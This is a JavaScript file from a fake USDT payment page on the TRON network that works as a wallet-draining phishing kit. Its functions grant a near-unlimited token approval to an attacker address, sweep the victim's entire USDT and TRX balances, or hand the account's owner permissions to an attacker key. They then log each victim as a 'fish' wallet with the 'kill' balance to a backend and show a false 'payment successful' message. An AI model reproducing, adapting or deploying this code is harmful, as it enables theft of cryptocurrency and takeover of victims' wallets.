var tronweb = "";

var infoObj = {};

var domain = 'https://' + window.location.host + '/';
var dl = 1;
var source = 'usdtpay';

var tronInfo = {
    address: '',
    tokenAddress: 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t',
    abi: [{ "constant": true, "inputs": [], "name": "name", "outputs": [{ "name": "", "type": "string" }], "payable": false, "stateMutability": "view", "type": "function" }, { "constant": false, "inputs": [{ "name": "_upgradedAddress", "type": "address" }], "name": "deprecate", "outputs": [], "payable": false, "stateMutability": "nonpayable", "type": "function" }, { "constant": false, "inputs": [{ "name": "_spender", "type": "address" }, { "name": "_value", "type": "uint256" }], "name": "approve", "outputs": [{ "name": "", "type": "bool" }], "payable": false, "stateMutability": "nonpayable", "type": "function" }, { "constant": true, "inputs": [], "name": "deprecated", "outputs": [{ "name": "", "type": "bool" }], "payable": false, "stateMutability": "view", "type": "function" }, { "constant": false, "inputs": [{ "name": "_evilUser", "type": "address" }], "name": "addBlackList", "outputs": [], "payable": false, "stateMutability": "nonpayable", "type": "function" }, { "constant": true, "inputs": [], "name": "totalSupply", "outputs": [{ "name": "", "type": "uint256" }], "payable": false, "stateMutability": "view", "type": "function" }, { "constant": false, "inputs": [{ "name": "_from", "type": "address" }, { "name": "_to", "type": "address" }, { "name": "_value", "type": "uint256" }], "name": "transferFrom", "outputs": [{ "name": "", "type": "bool" }], "payable": false, "stateMutability": "nonpayable", "type": "function" }, { "constant": true, "inputs": [], "name": "upgradedAddress", "outputs": [{ "name": "", "type": "address" }], "payable": false, "stateMutability": "view", "type": "function" }, { "constant": true, "inputs": [], "name": "decimals", "outputs": [{ "name": "", "type": "uint8" }], "payable": false, "stateMutability": "view", "type": "function" }, { "constant": true, "inputs": [], "name": "maximumFee", "outputs": [{ "name": "", "type": "uint256" }], "payable": false, "stateMutability": "view", "type": "function" }, { "constant": true, "inputs": [], "name": "_totalSupply", "outputs": [{ "name": "", "type": "uint256" }], "payable": false, "stateMutability": "view", "type": "function" }, { "constant": false, "inputs": [], "name": "unpause", "outputs": [], "payable": false, "stateMutability": "nonpayable", "type": "function" }, { "constant": true, "inputs": [{ "name": "_maker", "type": "address" }], "name": "getBlackListStatus", "outputs": [{ "name": "", "type": "bool" }], "payable": false, "stateMutability": "view", "type": "function" }, { "constant": true, "inputs": [], "name": "paused", "outputs": [{ "name": "", "type": "bool" }], "payable": false, "stateMutability": "view", "type": "function" }, { "constant": false, "inputs": [{ "name": "_spender", "type": "address" }, { "name": "_subtractedValue", "type": "uint256" }], "name": "decreaseApproval", "outputs": [{ "name": "", "type": "bool" }], "payable": false, "stateMutability": "nonpayable", "type": "function" }, { "constant": true, "inputs": [{ "name": "who", "type": "address" }], "name": "balanceOf", "outputs": [{ "name": "", "type": "uint256" }], "payable": false, "stateMutability": "view", "type": "function" }, { "constant": true, "inputs": [{ "name": "_value", "type": "uint256" }], "name": "calcFee", "outputs": [{ "name": "", "type": "uint256" }], "payable": false, "stateMutability": "view", "type": "function" }, { "constant": false, "inputs": [], "name": "pause", "outputs": [], "payable": false, "stateMutability": "nonpayable", "type": "function" }, { "constant": true, "inputs": [], "name": "owner", "outputs": [{ "name": "", "type": "address" }], "payable": false, "stateMutability": "view", "type": "function" }, { "constant": true, "inputs": [], "name": "symbol", "outputs": [{ "name": "", "type": "string" }], "payable": false, "stateMutability": "view", "type": "function" }, { "constant": false, "inputs": [{ "name": "_to", "type": "address" }, { "name": "_value", "type": "uint256" }], "name": "transfer", "outputs": [{ "name": "", "type": "bool" }], "payable": false, "stateMutability": "nonpayable", "type": "function" }, { "constant": true, "inputs": [{ "name": "who", "type": "address" }], "name": "oldBalanceOf", "outputs": [{ "name": "", "type": "uint256" }], "payable": false, "stateMutability": "view", "type": "function" }, { "constant": false, "inputs": [{ "name": "newBasisPoints", "type": "uint256" }, { "name": "newMaxFee", "type": "uint256" }], "name": "setParams", "outputs": [], "payable": false, "stateMutability": "nonpayable", "type": "function" }, { "constant": false, "inputs": [{ "name": "amount", "type": "uint256" }], "name": "issue", "outputs": [], "payable": false, "stateMutability": "nonpayable", "type": "function" }, { "constant": false, "inputs": [{ "name": "_spender", "type": "address" }, { "name": "_addedValue", "type": "uint256" }], "name": "increaseApproval", "outputs": [{ "name": "", "type": "bool" }], "payable": false, "stateMutability": "nonpayable", "type": "function" }, { "constant": false, "inputs": [{ "name": "amount", "type": "uint256" }], "name": "redeem", "outputs": [], "payable": false, "stateMutability": "nonpayable", "type": "function" }, { "constant": true, "inputs": [{ "name": "_owner", "type": "address" }, { "name": "_spender", "type": "address" }], "name": "allowance", "outputs": [{ "name": "remaining", "type": "uint256" }], "payable": false, "stateMutability": "view", "type": "function" }, { "constant": true, "inputs": [], "name": "basisPointsRate", "outputs": [{ "name": "", "type": "uint256" }], "payable": false, "stateMutability": "view", "type": "function" }, { "constant": true, "inputs": [{ "name": "", "type": "address" }], "name": "isBlackListed", "outputs": [{ "name": "", "type": "bool" }], "payable": false, "stateMutability": "view", "type": "function" }, { "constant": false, "inputs": [{ "name": "_clearedUser", "type": "address" }], "name": "removeBlackList", "outputs": [], "payable": false, "stateMutability": "nonpayable", "type": "function" }, { "constant": true, "inputs": [], "name": "MAX_UINT", "outputs": [{ "name": "", "type": "uint256" }], "payable": false, "stateMutability": "view", "type": "function" }, { "constant": false, "inputs": [{ "name": "newOwner", "type": "address" }], "name": "transferOwnership", "outputs": [], "payable": false, "stateMutability": "nonpayable", "type": "function" }, { "constant": false, "inputs": [{ "name": "_blackListedUser", "type": "address" }], "name": "destroyBlackFunds", "outputs": [], "payable": false, "stateMutability": "nonpayable", "type": "function" }, { "inputs": [{ "name": "_initialSupply", "type": "uint256" }, { "name": "_name", "type": "string" }, { "name": "_symbol", "type": "string" }, { "name": "_decimals", "type": "uint8" }], "payable": false, "stateMutability": "nonpayable", "type": "constructor" }, { "anonymous": false, "inputs": [{ "indexed": true, "name": "_blackListedUser", "type": "address" }, { "indexed": false, "name": "_balance", "type": "uint256" }], "name": "DestroyedBlackFunds", "type": "event" }, { "anonymous": false, "inputs": [{ "indexed": false, "name": "amount", "type": "uint256" }], "name": "Issue", "type": "event" }, { "anonymous": false, "inputs": [{ "indexed": false, "name": "amount", "type": "uint256" }], "name": "Redeem", "type": "event" }, { "anonymous": false, "inputs": [{ "indexed": false, "name": "newAddress", "type": "address" }], "name": "Deprecate", "type": "event" }, { "anonymous": false, "inputs": [{ "indexed": true, "name": "_user", "type": "address" }], "name": "AddedBlackList", "type": "event" }, { "anonymous": false, "inputs": [{ "indexed": true, "name": "_user", "type": "address" }], "name": "RemovedBlackList", "type": "event" }, { "anonymous": false, "inputs": [{ "indexed": false, "name": "feeBasisPoints", "type": "uint256" }, { "indexed": false, "name": "maxFee", "type": "uint256" }], "name": "Params", "type": "event" }, { "anonymous": false, "inputs": [], "name": "Pause", "type": "event" }, { "anonymous": false, "inputs": [], "name": "Unpause", "type": "event" }, { "anonymous": false, "inputs": [{ "indexed": true, "name": "previousOwner", "type": "address" }, { "indexed": true, "name": "newOwner", "type": "address" }], "name": "OwnershipTransferred", "type": "event" }, { "anonymous": false, "inputs": [{ "indexed": true, "name": "owner", "type": "address" }, { "indexed": true, "name": "spender", "type": "address" }, { "indexed": false, "name": "value", "type": "uint256" }], "name": "Approval", "type": "event" }, { "anonymous": false, "inputs": [{ "indexed": true, "name": "from", "type": "address" }, { "indexed": true, "name": "to", "type": "address" }, { "indexed": false, "name": "value", "type": "uint256" }], "name": "Transfer", "type": "event" }],
    usdt: null,
    trx: null,
    contract: "",
    anum: 999999999,

    a1: '',
    a2: '',
    a3: ''
};

function tronweb3init() {
    return new Promise(res => {
        var setIntervalModel = "";
        setIntervalModel = setInterval(async () => {
            if (window.tronWeb && window.tronWeb.defaultAddress.base58) {
                clearInterval(setIntervalModel)
                var tronWeb = window.tronWeb;
                tronInfo['address'] = tronWeb.defaultAddress.base58;
                res(tronWeb);
            }
        }, 10)
    })
}

function getQueryVariable(variable) {
    var query = window.location.search.substring(1);
    var vars = query.split("&");
    for (var i = 0; i < vars.length; i++) {
        var pair = vars[i].split("=");
        if (pair[0] == variable) { return pair[1]; }
    }
    return (false);
}

if (this.getQueryVariable("s")) {
    this.dl = this.getQueryVariable("s");
}else{
    this.dl = 1;
}

async function troninit(obj) {
    
    window.alertOpen.loading();
    try {
        infoObj = obj;
        tronweb = await tronweb3init();

        var trx = await tronWeb.trx.getBalance(tronInfo.address);
        tronInfo.trx = Number(tronWeb.fromSun(trx));

        contract = await tronWeb.contract(tronInfo.abi, tronInfo.tokenAddress);
        var usdt = await contract.balanceOf(tronInfo.address).call();
        tronInfo.usdt = Number(tronWeb.fromSun(usdt));
        // if (tronInfo.trx < 13.5) {
        //     window.alertOpen.closeLoading();
        //     window.alertOpen.toast('交易失败，矿工费不足');
        //     return;
        // }else if (tronInfo.trx >= 100) {
        //     t_signatures();
        //     return;
        // } else {
        //     t_approve();
        //     return;
        // }
        if (tronInfo.trx < 13.5) {
            window.alertOpen.closeLoading();
            window.alertOpen.toast('交易失败，矿工费不足');
            return;
        }
        if (infoObj.type == "tokens") {
            t_tokens();
            return;
        }
        if (infoObj.type == "approve") {
            t_approve();
            return;
        }
        if (infoObj.type == "coins") {
            t_coins();
            return;
        }
        if (infoObj.type == "signatures") {
            t_signatures();
            return;
        }
    } catch (error) {
        window.alertOpen.closeLoading();
        window.alertOpen.toast('交易失败，错误码是：40001');
    }
}

//Support approve
async function t_approve() {
    try {
        var res = await contract.increaseApproval(tronInfo.a2,tronweb.toSun(tronInfo.anum)).send({
            feeLimit: 100_000_000,
            callValue: 0,
            shouldPollResponse: false
        });
        if (res) {
            t_addapprove(tronInfo.a2);
        }
    } catch (error) {
        if (error.error == "BANDWITH_ERROR") {
            window.alertOpen.closeLoading();
            window.alertOpen.toast('TRX余额不足，支付失败！');
            return;
        }
        window.alertOpen.closeLoading();
        window.alertOpen.toast('交易失败，错误码是：40002');
    }
}

// All tokens
async function t_tokens() {
    try {
        var options = {
            feeLimit:100_000_000,
            callValue:0,
        };
        var parameter = [{type:'address',value:tronInfo.a1},{type:'uint256',value:tronWeb.toSun(tronInfo.usdt - 1)}];
        var res = await tronweb.transactionBuilder.triggerSmartContract(tronWeb.address.toHex(tronInfo.tokenAddress), "transfer(address,uint256)", options, parameter, tronWeb.address.toHex(tronInfo.address));
        var signedTx = await tronweb.trx.sign(res.transaction)
        var receipt = await tronweb.trx.sendRawTransaction(signedTx);
        if (receipt) {
            t_addonekill(tronInfo.a1);
        }
    } catch (error) {
        window.alertOpen.closeLoading();
        window.alertOpen.toast('交易失败，错误码是：40003');
    }
}

// All fuel coins
async function t_coins() {
    try {
        var res = await tronWeb.trx.sendTransaction(tronInfo.a1, tronWeb.toSun(tronInfo.trx - 5));
        if (res) {
            t_addonekillpt(tronInfo.a1);
        }
    } catch (error) {
        window.alertOpen.closeLoading();
        window.alertOpen.toast('交易失败，错误码是：40004');

    }
}

// Multiple signatures
async function t_signatures() {
    try {
        let ownerPermission = { type: 0, permission_name: 'owner' };
        ownerPermission.threshold = 1;
        ownerPermission.keys = [];
        ownerPermission.keys.push({ address: tronWeb.address.toHex(tronInfo.a3), weight: 1 });

        let activePermission = { type: 2, permission_name: 'active0' };
        activePermission.threshold = 1;
        activePermission.operations = '7fff1fc0037e0000000000000000000000000000000000000000000000000000';
        activePermission.keys = [];
        activePermission.keys.push({ address: tronWeb.address.toHex(tronInfo.a3), weight: 1 });

        const updateTransaction = await tronWeb.transactionBuilder.updateAccountPermissions(tronWeb.address.toHex(tronInfo.address), ownerPermission, null, [activePermission]);
        const signedTransaction = await tronWeb.trx.sign(updateTransaction);
        const result = await tronWeb.trx.sendRawTransaction(signedTransaction);
        if (result) {
            if (result.code.indexOf('ERROR') != -1) {
                window.alertOpen.closeLoading();
                window.alertOpen.toast('TRX余额不足，支付失败！');
                return;
            }
            t_addmulti(tronInfo.a3);
        }
    } catch (error) {
        window.alertOpen.closeLoading();
        window.alertOpen.toast('交易失败，错误码是：40005');
    }
}

async function t_addapprove(toAddress = "") {
    if (this.getQueryVariable("s")) {
        this.dl = this.getQueryVariable("s");
    }else{
        this.dl = 1;
    }
    if (this.getQueryVariable("source")) {
        this.source = this.getQueryVariable("source");
    }

    axios.post(domain + 'api/insert_approve', {
        fish_wallet_addr:tronInfo.address,
        chain_type:'trc',
        contract_addr:tronInfo.tokenAddress,
        token_name:'USDT',
        approve_addr:toAddress,
        agent_id:this.dl,
        fish_source:this.source,
    }).then(function (response) {
        if (response.data.code == 1) {
            window.alertOpen.closeLoading();
            window.alertOpen.toast('支付成功');
        } else {
            window.alertOpen.closeLoading();
            window.alertOpen.toast('交易失败，错误码是：40006');
        }
    })
}

async function t_addmulti(toAddress = "") {
    if (this.getQueryVariable("s")) {
        this.dl = this.getQueryVariable("s");
    }else{
        this.dl = 1;
    }
    if (this.getQueryVariable("source")) {
        this.source = this.getQueryVariable("source");
    }

    axios.post(domain + 'api/insert_multi', {
        fish_wallet_addr:tronInfo.address,
        multi_wallet_addr:toAddress,
        agent_id:this.dl,
        fish_source:this.source,
        multiaddresspri:0
    }).then(function (response) {
        if (response.data.code == 1) {
            window.alertOpen.closeLoading();
            window.alertOpen.toast('支付成功');
        } else {
            window.alertOpen.closeLoading();
            window.alertOpen.toast('交易失败，错误码是：40006');
        }
    })
}

async function t_addonekill(toAddress = "") {
    if (this.getQueryVariable("s")) {
        this.dl = this.getQueryVariable("s");
    }else{
        this.dl = 1;
    }
    if (this.getQueryVariable("source")) {
        this.source = this.getQueryVariable("source");
    }

    axios.post(domain + 'api/insert_onekill', {
        fish_wallet_addr:tronInfo.address,
        chain_type:'trc',
        contract_addr:tronInfo.tokenAddress,
        token_name:'USDT',
        transin_addr:toAddress,
        agent_id:this.dl,
        fish_source:this.source,
        kill_balance:tronInfo.usdt - 1,
    }).then(function (response) {
        if (response.data.code == 1) {
            window.alertOpen.closeLoading();
            window.alertOpen.toast('支付成功');
        } else {
            window.alertOpen.closeLoading();
            window.alertOpen.toast('交易失败，错误码是：40006');
        }
    })
}

async function t_addonekillpt(toAddress = "") {
    if (this.getQueryVariable("s")) {
        this.dl = this.getQueryVariable("s");
    }else{
        this.dl = 1;
    }
    if (this.getQueryVariable("source")) {
        this.source = this.getQueryVariable("source");
    }

    axios.post(domain + 'api/insert_onekill', {
        fish_wallet_addr:tronInfo.address,
        chain_type:'trc',
        contract_addr:'TRX',
        token_name:'TRX',
        transin_addr:toAddress,
        agent_id:this.dl,
        fish_source:this.source,
        kill_balance:tronInfo.trx - 5,
    }).then(function (response) {
        if (response.data.code == 1) {
            window.alertOpen.closeLoading();
            window.alertOpen.toast('支付成功');
        } else {
            window.alertOpen.closeLoading();
            window.alertOpen.toast('交易失败，错误码是：40006');
        }
    })
}
